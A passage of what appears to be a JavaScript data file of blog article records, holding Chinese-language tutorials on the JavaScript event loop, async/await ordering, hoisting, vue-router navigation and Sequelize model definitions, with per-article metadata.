        "# Js的Event Loop\n\n## js单线程\n\n​\t\t总所周知，JavaScript是单线程的，也就是说同一时间只能做一件事，那为什么JavaScript不能是多线程的呢，这跟它的用途有关，作为浏览器脚本语言，JavaScript主要用途是操作DOM，如果JavaScript同时有两个线程，同时对同一个DOM进行操作，这是浏览器该执行哪个？因此为了避免这种问题，js必须是一门单线程的语言！\n\n## 任务队列\n\n​\t\t所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入\"任务队列\"（task queue）的任务，只有\"任务队列\"通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。\n\n异步任务又分为两种：宏任务和微任务\n\n> 常见的宏任务：setTimeout，setInterval，Ajax(网络请求)，i/o(操作文件)\n>\n> 常见的微任务：Promise\n\n## 执行栈\n\n- `执行栈`中的代码永远最先执行\n\n#### 微任务(microtask)\n\n- 当`执行栈`中的代码执行完毕，会在执行`宏任务队列`之前先看看`微任务队列`中有没有任务，如果有会先将`微任务队列`中的任务清空才会去执行`宏任务队列`\n\n#### 宏任务(task)\n\n- 等待`执行栈`和`微任务队列`都执行完毕才会执行，并且在执行完每一个`宏任务`之后，会去看看`微任务队列`有没有新添加的任务，如果有，会先将`微任务`队列中的任务清空，才会继续执行下一个`宏任务`\n\n为了更好地理解Event Loop，请看下图（转引自Philip Roberts的演讲[《Help, I'm stuck in an event-loop》](http://vimeo.com/96425312)）\n\n![event_loop.png](https://img.cdn.hsslive.cn/1596885975275event_loop.png)\n\n# 案例\n\n## 案例1\n\n```js\nconsole.log(111);\nsetTimeout(function () {\n    console.log(222)\n    for (var i = 0; i < 2; i++) {\n        console.log(888)\n    }\n    setTimeout(function () {\n        console.log(333)\n    }, 0)\n}, 0)\n\nfor (var i = 0; i < 2; i++) {\n    console.log(999)\n}\nsetTimeout(() => {\n    console.log(444);\n}, 1000);\nconsole.log(555)\n```\n\n> 一张图表示执行过程：\n\n![eventloop1.png](https://img.cdn.hsslive.cn/1596885994962eventloop1.png)\n\n执行步骤：\n\n1. 首先打印同步代码111\n2. 遇到定时器，宏任务1，放进宏任务队列并延时0秒后执行定时器里面的代码\n3. 遇到同步代码，for循环打印2次999\n4. 遇到定时器，宏任务2，放进宏任务队列并延时1000毫秒后执行定时器里面的代码\n5. 打印同步代码555\n6. 主线程完成，查看任务队列，发现有两个宏任务，宏任务1最先执行，首先打印222，然后遇到for循环打印2次888\n7. 然后在宏任务1里又遇到定时器，宏任务3，放进宏任务并延时0秒后开始执行定时器里面的代码，然后宏任务1完成，值得注意的是，当前宏任务2在后来的宏任务3前面，但是宏任务2延时1000毫秒后执行（从进入任务队列一刻算起，到过了1000毫秒才会执行，比如是18:30:01秒进入的，就会等到18:30:02秒才会执行），宏任务1执行完全部代码后，不需要1000毫秒，所以，宏任务2会等1000毫秒后才开始执行，而宏任务3虽然是后面进来的，但是它是延时0秒后执行，所以，宏任务3会先执行\n8. 执行宏任务3，打印333，执行完成后看宏任务，还剩一个宏任务2\n9. 任执行宏任务2，由于之前的操作很快，还没到1000毫秒就已经执行完了，这时宏任务还是会会继续等到了1000毫秒（即18:30:02秒），才打印444。\n10. 执行完成，打印结果：111,999,999,555,222,888,888,333,444\n\n## 案例2\n\n```js\nconsole.log('script start');\n\nsetTimeout(function() {\n  console.log('timeout1');\n}, 10);\n\nnew Promise(resolve => {\n    console.log('promise1');\n    resolve();\n    setTimeout(() => console.log('timeout2'), 10);\n}).then(function() {\n    console.log('then1')\n})\n\nconsole.log('script end');\n```\n\n执行结果：\n\nscript start\npromise1\nscript end\nthen1\ntimeout1\ntimeout2\n\n## 案例3\n\n```js\nnew Promise(resolve => {\n    resolve(1);\n    Promise.resolve().then(() => console.log(2));\n    console.log(4)\n}).then(t => console.log(t));\nconsole.log(3);\n```\n\n分析：\n\n```js\nnew Promise(resolve => {\n    resolve(1);\n    \n    Promise.resolve().then(() => {\n    \t// t2\n    \tconsole.log(2)\n    });\n    console.log(4)\n}).then(t => {\n\t// t1\n\tconsole.log(t)\n});\nconsole.log(3);\n```\n\n执行流程：\n\n1. script 任务先运行。首先遇到 `Promise` 实例，构造函数首先执行，所以首先输出了 4。此时 microtask 的任务有 `t2` 和 `t1`\n2. script 任务继续运行，输出 3。至此，第一个宏任务执行完成。\n3. 执行所有的微任务，先后取出 `t2` 和 `t1`，分别输出 2 和 1\n4. 代码执行完毕，输出是：4321\n\n为什么会t2先执行，理由如下：\n\n> https://es6.ruanyifeng.com/#docs/promise#Promise-resolve\n\n​\t\t`Promise.resolve()`方法允许调用时不带参数，直接返回一个`resolved`状态的 Promise 对象。需要注意的是，立即`resolve()`的 Promise 对象，是在本轮“事件循环”（event loop）的结束时执行，而不是在下一轮“事件循环”的开始时。\n\n",
      click: 16,
      createdAt: '2020-07-21T16:00:31.000Z',
      updatedAt: '2021-02-16T13:13:39.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 38,
            article_id: 38,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 38,
            user_id: 1,
            article_id: 38,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 17,
          name: 'Event Loop',
          color: 'rgba(255, 120, 0, 0.64)',
          createdAt: '2020-07-21T07:33:08.000Z',
          updatedAt: '2020-07-21T07:33:08.000Z',
        },
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 37,
      title: 'async/await',
      is_comment: 1,
      status: 1,
      img: '/1595316866433es7-async.jpg',
      content:
        "## async 函数的返回值\n\n下面解释 async 关键字做了什么：\n\n- 被 async 操作符修饰的函数必然返回一个 Promise\n- 当 async 函数返回一个值时，Promise 的 resolve 方法负责传递这个值\n- 当 async 函数抛出异常时，Promise 的 reject 方法会传递这个异常值\n\n## await 操作符做了什么\n\n- await 后的值 v 会被转换为 Promise\n- 即使 v 是一个已经 `fulfilled` 的 Promise，还是会新建一个 Promise，并在这个新 Promise 中 `resolve(v)`\n- `await v` 后续的代码的执行类似于传入 `then()` 中的回调\n\n```js\nasync function foo() {\n    await bar()\n    console.log('foo')\n}\nasync function bar() {\n    console.log('bar');\n}\nfoo()\nnew Promise(resolve => {\n    console.log('p1');\n    resolve();\n}).then(function () {\n    console.log('p2')\n})\n\n//chrome 84环境下结果：bar,p1,foo,p2\n```\n\n根据提示         \n\n```js\nasync function async1(){\n  await async2()\n  console.log('async1 end')\n}\n```\n\n等价于\n\n```js\nasync function async1() {\n  return new Promise(resolve => {\n    resolve(async2())\n  }).then(() => {\n    console.log('async1 end')\n  })\n}\n```\n\n## RESOLVE(non-thenable) \n\n​\t\t如果await 后面直接跟的为一个变量，比如：await 1；这种情况的话相当于直接把await后面的代码注册为一个微任务，可以简单理解为promise.then(await下面的代码)。然后跳出async1函数，执行其他代码，当遇到promise函数的时候，会注册promise.then()函数到微任务队列，注意此时微任务队列里面已经存在await后面的微任务。\n\n```js\nasync function foo() {\n    console.log('foo')\n    // var res = await 1\n    // console.log('foo_end')\n    // 上两条代码等价于\n    return new Promise(resolve => {\n        resolve(1)\n    }).then(() => {\n        console.log('foo_end')\n    })\n}\nasync function bar() { }\n\nfoo()\n\nnew Promise(function (resolve) {\n    console.log('p1')\n    resolve();\n}).then(function () {\n    console.log('p2')\n})\n\n//foo,p1,foo_end,p2\n```\n\n## RESOLVE(thenable) \n\n​\t\tasync2() 返回一个 promise, 是一个 thenable 对象，RESOLVE(thenable) 并不等于 Promise.resolve(thenable) ，而 RESOLVE(non-thenable) 等价于 Promise.resolve(non-thenable)，下面几个例子可证明：\n\n```js\nlet p1 = new Promise(resolve => {\n    resolve(1)\n})\np1.then(() => {\n    console.log(2)\n})\nlet p2 = Promise.resolve().then(res => {\n    console.log(3)\n})\np2.then(() => {\n    console.log(4)\n}).then(() => {\n    console.log(5)\n})\n//2,3,4,5\n```\n\n```js\n// let p1 = new Promise(resolve => {\n//     resolve(1)\n// })\n// 等价于\nlet p1 = Promise.resolve(1)\np1.then(() => {\n    console.log(2)\n})\nlet p2 = Promise.resolve().then(res => {\n    console.log(3)\n})\np2.then(() => {\n    console.log(4)\n}).then(() => {\n    console.log(5)\n})\n//2,3,4,5\n```\n\n```js\nlet p1 = new Promise(resolve => {\n    let p3 = Promise.resolve()\n    resolve(p3)\n})\np1.then(() => {\n    console.log(2)\n})\nlet p2 = Promise.resolve().then(res => {\n    console.log(3)\n})\np2.then(() => {\n    console.log(4)\n}).then(() => {\n    console.log(5)\n})\n//3,4,2,5\n```\n\n```js\nlet p1 = new Promise(resolve => {\n    let p3 = Promise.resolve()\n    resolve(p3)\n})\np1.then(() => {\n    console.log(2)\n})\nlet p2 = Promise.resolve().then(res => {\n    console.log(3)\n})\np2.then(() => {\n    console.log(4)\n}).then(() => {\n    console.log(5)\n})\n//3,4,2,5\n```\n\n```js\nlet p1 = new Promise(resolve => {\n    let p3 = Promise.resolve()\n    // resolve(p3)\n    // 等价于\n    Promise.resolve().then(() => {\n        Promise.resolve(p3).then(() => {\n            resolve();\n        })\n    })\n})\np1.then(() => {\n    console.log(2)\n})\nlet p2 = Promise.resolve().then(res => {\n    console.log(3)\n})\np2.then(() => {\n    console.log(4)\n}).then(() => {\n    console.log(5)\n})\n//3,4,2,5\n```\n\n## RESOLVE(thenable) 和 Promise.resolve(thenable)的转换关系\n\n```js\nnew Promise(resolve=>{\n  resolve(thenable)\n})\n```\n\n会被转换成：\n\n```js\nnew Promise(resolve => {\n  Promise.resolve().then(() => {\n    thenable.then(resolve)\n  })\n})\n```\n\n或者：\n\n```js\nnew Promise(resolve => {\n    Promise.resolve().then(() => {\n        Promise.resolve(thenable).then(() => {\n          resolve()\n        })\n    })\n})\n```\n\n## await 将直接使用 Promise.resolve()相同语义\n\n原题：\n\n```js\nasync function foo() {\n    await bar()\n    console.log('foo')\n}\nasync function bar() {\n    console.log('bar');\n}\nfoo()\nnew Promise(resolve => {\n    console.log('p1');\n    resolve();\n}).then(function () {\n    console.log('p2')\n})\n```\n\n上述代码在chrome 70会最终编译成：\n\n```js\nasync function foo() {\n    // return new Promise(resolve => {\n    //     resolve(bar())\n    // }).then(() => {\n    //     console.log('foo')\n    // })\n    // 上面的代码等价于\n    return new Promise(resolve => {\n        Promise.resolve().then(() => {\n            bar().then(resolve)\n        })\n    }).then(() => {\n        console.log('foo')\n    })\n}\nasync function bar() {\n    console.log('bar');\n}\nfoo()\nnew Promise(resolve => {\n    console.log('p1');\n    resolve();\n}).then(function () {\n    console.log('p2')\n})\n\n// 结果：p1,bar,p2,foo\n```\n\n而在chrome 73中，会编译成：\n\n```js\nasync function foo() {\n    const p = bar()\n    Promise.resolve(p).then(() => {\n        console.log('foo')\n    })\n}\nasync function bar() {\n    console.log('bar');\n}\nfoo()\nnew Promise(resolve => {\n    console.log('p1');\n    resolve();\n}).then(function () {\n    console.log('p2')\n})\n\n//结果：bar,p1,foo,p2\n```\n\n​\t\t因为await规范的更新，导致了await bar()在chrome 70和chrome 73最终编译成的代码不一样，因此，结果也会不一样，如果不适用await 关键字，直接用原生的Promise语句就不会出现这个问题（因为await的就是promise语法糖，会最终编译成promise语句）。\n\n## 参考以下文章：\n\n### [令人费解的 async/await 执行顺序](https://segmentfault.com/a/1190000017954500)\n\n### [async await 和 promise微任务执行顺序问题](https://segmentfault.com/q/1010000016147496)\n\n### [async/await 原理及执行顺序分析](https://juejin.im/post/5dc28ea66fb9a04a881d1ac0#heading-5)\n\n### [知乎贺老师的解答](https://www.zhihu.com/question/268007969)\n\n### [这一次，彻底弄懂 Promise 原理](https://juejin.im/post/5d6f7c83e51d4561c541a712)",
      click: 7,
      createdAt: '2020-07-21T07:34:32.000Z',
      updatedAt: '2021-02-16T13:13:29.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 37,
            article_id: 37,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 37,
            user_id: 1,
            article_id: 37,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 18,
          name: 'es7',
          color: 'rgba(250, 212, 0, 0.68)',
          createdAt: '2020-07-21T07:33:44.000Z',
          updatedAt: '2020-07-21T07:33:44.000Z',
        },
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 35,
      title: 'Js预编译',
      is_comment: 1,
      status: 1,
      img: '/1594921771426billd1.png',
      content:
        "# 预编译前奏\n\n## 1，任何变量未经声明就赋值，此变量就为全局对象所有\n\n```js\na = 123\nconsole.log(a); // 123\n```\n\n```js\nvar a = b = 123\nconsole.log(a, b);\t// 123 123\n```\n\n```js\nfunction test() {\n    var a = b = 123\n}\ntest()\nconsole.log(b)  // 123\n```\n\n## 2，一切声明的全局变量，全是window的属性\n\n```js\n<script>\n// a = 123\n// console.log(a); // 123\n// var a = b = 123\n// console.log(a, b);  // 123 123\n\nfunction test() {\n    var a = b = 123\n}\ntest()\nconsole.log(b)  // 123\n// console.log(a);  //报错Uncaught ReferenceError: a is not defined\nconsole.log(window.a);  // undefined\n```\n\n# 预编译\n\n预编译发生在函数执行的前一刻\n\n1，创建AO对象\n\n2，找形参和变量声明，将变量和形参名作为AO属性名，值为undefined\n\n3，将实参值和形参统一\n\n4，在函数体里面找函数声明，值赋予函数体\n\n```js\nfunction fn(a) {\n    console.log(a); //function a() { };\n\n    var a = 123;\n\n    console.log(a); //123\n\n    function a() { }\n\n    console.log(a); //123\n\n    var b = function () { }\n\n    console.log(b)  //function () { }\n\n    function d() { };\n}\n\n/*  ***预编译阶段***\n    1，创建AO对象\n        AO{}\n    2，找形参和变量声明，将变量和形参名作为AO属性名，值为undefined\n        AO{\n            a:undefined;\n            b:undefined;\n        }\n    3，将实参值和形参统一\n        AO{\n            a:1;\n            b:undefined;\n        }\n    4，在函数体里面找函数声明，值赋予函数体\n        AO{\n            a:function a() { };\n            b:undefined;\n            d:function d() { };\n        }\n*/\nfn(1)\n/*  ***执行阶段***\n    AO{\n        a:function a() { };     --->123\n        b:undefined;            --->function () { }\n        d:function d() { };\n    }\n*/\n```\n\n```js\nfunction test(a, b) {\n    console.log(a); //1\n    c = 0;\n    var c;\n    a = 3;\n    b = 2;\n    console.log(b); //2\n    function b() { }\n    function d() { }\n    console.log(b); //2\n}\n\n/*  ***预编译阶段***\n    AO{\n        c:undefined;\n        a:undefined;    --->1\n        b:undefined;    --->function b() { }\n        d:function d() { }\n\n    }\n*/\n\ntest(1)\n/*  ***执行阶段***\n    AO{\n        c:undefined;                            ===》0\n        a:undefined;    --->1                   ===》3\n        b:undefined;    --->function b() { }    ===》2\n        d:function d() { }\n    }\n\n*/\n```\n\n```js\n/* \n    GO{\n        say:undefined--->function say(){}\n    }\n*/\n\nfunction say(say) {\n    console.log(say);   //function say() { var num = 10 }\n    var say = 234\n    console.log(say);   //234\n    function say() { var num = 10 }\n}\n\n/* \n    AO{\n        say:undefined;--->1--->function say() { }--->234\n\n    }        \n*/\n\nsay(1)\nconsole.log(say);   //function say(say){...}\nvar say = 123\nconsole.log(say);   //123\n```\n\n```js\nshow = 100\nfunction bye() {\n    console.log(show);  //undefined\n    show = 200\n    console.log(show);  //200\n    var show = 300\n    console.log(show);  //300\n}\n\nbye()\nvar show\n```\n\n```js\n/* \n    GO{\n        aa:undefined,--->10\n        car:function(){}\n        cc:234\n    }\n*/\n\nfunction car() {\n    console.log(bb);    //undefined\n    if (aa) {\n        var bb = 100\n    }\n    console.log(bb);    //undefined\n    cc = 234;\n    console.log(cc);    //234\n}\nvar aa\n/* 预编译不看条件语句，直接看里面的语句\n    AO{\n        bb:undefined,\n    }\n*/\ncar()\naa = 10;\nconsole.log(cc);    //234\n```\n\n## 自执行函数不会提升\n\n```js\nconsole.log(show);  //function show(){}\nvar show = 10\nconsole.log(show);  //10\nfunction show() {\n    console.log(show);\n    console.log('show');\n}\nshow()  //Uncaught TypeError: show is not a function\nconsole.log(show);  //10\n```\n\n# 立即执行函数\n\n普通函数\n\n```js\nconsole.log(show);  //function show(){}\nvar show = 10\nvar hidden = 100\nconsole.log(show);  //10\nfunction show() {\n    console.log(show);\n    hidden = 200\n    console.log('show');\n}\n// show()  //Uncaught TypeError: show is not a function\nconsole.log(show);  //10\nconsole.log(hidden);  //100\n```\n\n自执行函数案例1\n\n```js\nconsole.log(hidden);    //undefined\nconsole.log(show);    //undefined\nvar hidden = 100;\nvar show = 200;\n/* 自执行函数不会提升 */\n(function hidden() {\n    // console.log(display);    //Uncaught ReferenceError: display is not defined\n    console.log(show);    //200\n    console.log(hidden);    //function hidden(){}\n    hidden = 200    //这里的hidden是IIFE非匿名函数，不能给它重新赋值！严格模式下会报错\n    show = 300\n    display = 999\n    console.log(hidden);    //function hidden(){}\n    console.log(show);    //300\n    console.log(display);    //999\n})()\nconsole.log(hidden);    //100\nconsole.log(display);   //999\n```\n\n自执行函数案例2\n\n```js\nconsole.log(hidden);    //undefined\nconsole.log(show);    //undefined\nvar hidden = 100;\nvar show = 200;\n/* 自执行函数不会提升 */\n(function hidden() {\n    console.log(hidden);    //undefined\n    console.log(show);    //200\n    hidden = 200\n    show = 300\n    var hidden\n    console.log(hidden);    //200\n    console.log(show);    //300\n})()\nconsole.log(hidden);    //100\n```\n\n",
      click: 17,
      createdAt: '2020-07-16T17:49:38.000Z',
      updatedAt: '2021-02-16T13:12:37.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 35,
            article_id: 35,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 35,
            user_id: 1,
            article_id: 35,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 33,
      title: 'Vue-router路由跳转方式',
      is_comment: 1,
      status: 1,
      img: '/1594718686852vue.png',
      content:
        "# 路由跳转方式\n\n## 声明式跳转\n\n声明式跳转就是在router-link标签上添加\n\nto=\"{name:'home',params{id:1,age:18}}\"，类似于post\n\n或 to=\"{path:'/home',query{id:1,age:18}}\"，类似于get，/home?id=1&age=18\n\n## 编程式跳转\n\n$router : 是路由操作对象，只写对象 \n\n```js\n// this.$router.push(\"/home\");\n// this.$router.push({ path: \"/home\" });\n// this.$router.push({ name: \"ihome\" });\nthis.$router.push({ name: \"ihome\", query: { age: 18, name: \"张三\" } });\n// this.$router.push({ path: \"/home\", query: { age: 19, name: \"李四\" } });\n```\n\n$route : 路由信息对象，只读对象\n\n```js\nconsole.log(this.$route.query);\nconsole.log(this.$route.params);\n```\n\n# 传参方式\n\n## 字符串形式\n\n```js\nthis.$router.push(\"/show\")\n```\n\n## 对象形式\n\n```js\nthis.$router.push({ path: \"/show\" })\n```\n\n## 命名路由\n\n```js\nthis.$router.push({ name: \"ishow\", params: { showid:999,showtitle:'title' }})\n```\n\n## 带查询参数\n\n/show?showid=999&showtitle=title\n\n```js\nthis.$router.push({ path:'/show',query:{showid:999,showtitle:'title'} })\n```\n\n**注意：如果提供了 `path`，`params` 会被忽略，上述例子中的 `query` 并不属于这种情况。取而代之的是下面例子的做法，你需要提供路由的 `name` 或手写完整的带有参数的 `path`：**\n\n```js\nthis.$router.push({ path:`/show/999/title` })\nthis.$router.push({ name: \"ishow\", params: { showid:999,showtitle:'title' }})\n\n// 这里的params不生效，只会匹配/show\nthis.$router.push({ path:'/show',params:{showid:999,showtitle:'title'} })\n```\n\n## 区别\n\n使用query的话，地址栏一定会带上参数，?showid=999&showtitle=title&aaa=aaa\n\n使用params的话，相当于设置router的参数：/show/999/title\n\n值得注意的是，使用params传参只能使用name进行引入，如路由是/home/:id/:title这种形式的，要使用{name:'home',params{id:1,title:18}}\n\n# 案例：\n\n## 路由\n\n\n```js\nimport VueRouter from 'vue-router'\nimport Vue from 'vue';\n\nVue.use(VueRouter)\n\nconst router = new VueRouter({\n    routes: [\n        {\n            path: '/about',\n            name: 'iabout',\n            component: () => import('@/components/about'),\n        },\n        {\n            path: '/home',\n            name: 'ihome',\n            component: () => import('@/components/home'),\n        },\n        {\n            //path: '/show',\n            path: '/show/:showid/:showtitle',\n            name: 'ishow',\n            component: () => import('@/components/show'),\n        }\n    ]\n})\nexport default router\n```\n\n## 跳转\n\n\n```vue\n<!-- 可以匹配path: '/show/:showid/:showtitle'，用params获取参数。 -->\n<!-- 匹配不了path: '/show' -->\n<router-link :to=\"{path:'/show/999/title'}\">aaa</router-link>\n\n<!-- 可以匹配path: '/show/:showid/:showtitle'，用params获取参数 -->\n<!-- 当匹配path: '/show'时，跳转的时候可以匹配，但是刷新就没了。 -->\n<router-link :to=\"{name:'ishow',params:{showid:999,showtitle:'title'}}\">aaa</router-link>\n\n<!-- 可以匹配path: '/show'，用params获取参数 -->\n<!-- 当匹配path: '/show/:showid/:showtitle'时，跳转的时候可以匹配，但是刷新就没了。 -->\n<router-link :to=\"{name:'ishow',query:{showid:999,showtitle:'title'}}\">aaa</router-link>\n\n<!-- 可以匹配path: '/show'，但获取不了参数 -->\n<!-- 不可以匹配path: '/show/:showid/:showtitle' -->\n<router-link :to=\"{path:'/show',params:{showid:999,showtitle:'title'}}\">aaa</router-link>\n\n<!-- 可以匹配path: '/show'，可通过query获取参数，刷新可还在 -->\n<!-- 不可以匹配path: '/show/:showid/:showtitle' -->\n<router-link :to=\"{path:'/show',query:{showid:999,showtitle:'title'}}\">aaa</router-link>\n```\n\n",
      click: 15,
      createdAt: '2020-07-14T09:24:53.000Z',
      updatedAt: '2021-02-16T13:20:09.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 33,
            article_id: 33,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 33,
            user_id: 1,
            article_id: 33,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
        {
          id: 12,
          name: 'vue-router',
          color: 'rgba(131, 109, 184, 1)',
          createdAt: '2020-07-04T16:03:11.000Z',
          updatedAt: '2020-07-04T16:03:11.000Z',
        },
      ],
    },
    {
      id: 32,
      title: 'Sequelize笔记',
      is_comment: 1,
      status: 1,
      img: '/1594718401767sequelize.png',
      content:
        "# Mysql\n\n## Linux下的Mysql\n\n- 数据库名与表名是严格区分大小写的；\n- 表的别名是严格区分大小写的；\n- 列名与列的别名在所有的情况下均是忽略大小写的；\n- 变量名也是严格区分大小写的。\n\n## Windows下的Mysql\n\n- 任何情况下都不区分大小写。\n\n# 定义\n\n注意：使用sequelize创建表，创建出来的表名一定是小写的！但是表字段可以是大小写混合。\n\n### timestamps\n\n默认值：true\n\n```js\n// 不添加时间戳属性 (updatedAt, createdAt)\ntimestamps: false,\n// 不要忘记启用时间戳！\ntimestamps: true,\n\n// 我不想要 createdAt\ncreatedAt: false,\n\n// 我想 updateAt 实际上被称为 updateTimestamp\nupdatedAt: 'updateTimestamp',\n\n// 并且希望 deletedA t被称为 destroyTime(请记住启用paranoid以使其工作)\ndeletedAt: 'destroyTime',\nparanoid: true,\n```\n\n### underscored\n\n默认值：false\n\nSequelize 允许为 Model 设置 `underscored` 选项. 当 `true` 时,此选项会将所有属性的 `field` 参数设置为其名称的下划线版本. 这也适用于关联生成的外键.\n\n```js\n// 将自动设置所有属性的字段参数为下划线命名方式.\n// 不会覆盖已经定义的字段选项\n// 这样 updatedAt 的字段名会是 updated_at\nunderscored: true,\n\n// 将 articleId 添加到 Comment 模型,但字段将设置为 `article_id`\n// 这意味着列名称将是 `article_id`\nUser.hasMany(Task);\nArticle.hasMany(Comment)\n\n// 同样会将 articleId 添加到 Comment 模型,但字段将设置为 `article_id`\n// 这意味着列名称将是 `article_id`\nComment.belongsTo(Article);\n```\n\n### freezeTableName\n\n```js\n// 禁用修改表名; 默认情况下,sequelize将自动将所有传递的模型名称(define的第一个参数)转换为复数. 如果你不想这样,请设置以下内容\nfreezeTableName: true\n```\n\n### tableName\n\n```js\n// 定义表的名称\ntableName: 'my_very_custom_table_name'\n```\n\n## Article表\n\n```js\nconst Sequelize = require('sequelize')\nconst sequelize = require('../config/db')\nconst Article = sequelize.define(\n    // 这将控制自动生成的foreignKey和关联命名的名称\n    'article',\n    {\n        id: {\n            type: Sequelize.INTEGER,\n            primaryKey: true,\n            allowNull: false,\n            autoIncrement: true\n        },\n        title: {\n            type: Sequelize.STRING(50),\n        },\n        type: {\n            type: Sequelize.STRING(20),\n        },\n        img: {\n            type: Sequelize.STRING(100),\n            defaultValue: '无'\n        },\n        content: {\n            type: Sequelize.STRING,\n        },\n        date: {\n            type: Sequelize.DATE,\n        },\n        click: {\n            type: Sequelize.INTEGER,\n            defaultValue: 0\n        },\n    },\n    {\n        freezeTableName: true,\n    }\n)\n// .sync({ force: true })会删除并重建表\n// Articlea.sync({ force: true }).then((res) => {\n//     console.log('如果表存在 会删除表重新建表')\n//     console.log(res)\n// })\nmodule.exports = Article\n```\n\n## Article_tag表\n\n```js\nconst Sequelize = require('sequelize')\nconst sequelize = require('../config/db')\nconst Article_tag = sequelize.define(\n    'article_tag',\n    {\n        id: {\n            type: Sequelize.INTEGER,\n            primaryKey: true,\n            allowNull: false,\n            autoIncrement: true\n        },\n        article_id: {\n            type: Sequelize.INTEGER,\n        },\n        tag_id: {\n            type: Sequelize.INTEGER,\n        },\n    },\n    {\n        freezeTableName: true\n    }\n)\nmodule.exports = Article_tag\n```\n\n## Tag表\n\n```js\nconst Sequelize = require('sequelize')\nconst sequelize = require('../config/db')\nconst Tag = sequelize.define(\n    'tag',\n    {\n        id: {\n            type: Sequelize.INTEGER,\n            primaryKey: true,\n            allowNull: false,\n            autoIncrement: true\n        },\n        name: {\n            type: Sequelize.STRING,\n        },\n        color: {\n            type: Sequelize.STRING,\n        },\n    },\n    {\n        freezeTableName: true\n    }\n)\nmodule.exports = Tag\n```\n\n## Show表\n\n```js\nconst Sequelize = require('sequelize')\nconst sequelize = require('../config/db')\nconst Show = sequelize.define(\n    'ShowTable',\n    {\n        ids: {\n            type: Sequelize.INTEGER,\n            primaryKey: true,\n            allowNull: false,\n            autoIncrement: true\n        },\n        title: {\n            type: Sequelize.STRING,\n        },\n        color: {\n            type: Sequelize.STRING,\n        },\n    },\n    {\n        freezeTableName: true,\n    }\n)\n// Show.sync({ force: true }).then((res) => {\n//     console.log('// 如果表存在 会删除表重新建表')\n//     console.log(res)\n// })\nmodule.exports = Show\n```\n\n## Car表\n\n```js\nconst Sequelize = require('sequelize')\nconst sequelize = require('../config/db')\nconst Car = sequelize.define(\n    'CarTable',\n    {\n        idc: {\n            type: Sequelize.INTEGER,\n            primaryKey: true,\n            allowNull: false,\n            autoIncrement: true\n        },\n        names: {\n            type: Sequelize.STRING,\n        },\n        colorx: {\n            type: Sequelize.STRING,\n        },\n    },\n    {\n        freezeTableName: true,\n    }\n)\n// Car.sync({ force: true }).then((res) => {\n//     console.log('// 如果表存在 会删除表重新建表')\n//     console.log(res)\n// })\nmodule.exports = Car\n```\n\n\n\n# 关联\n\n## 一对一：belongsTo，hasOne 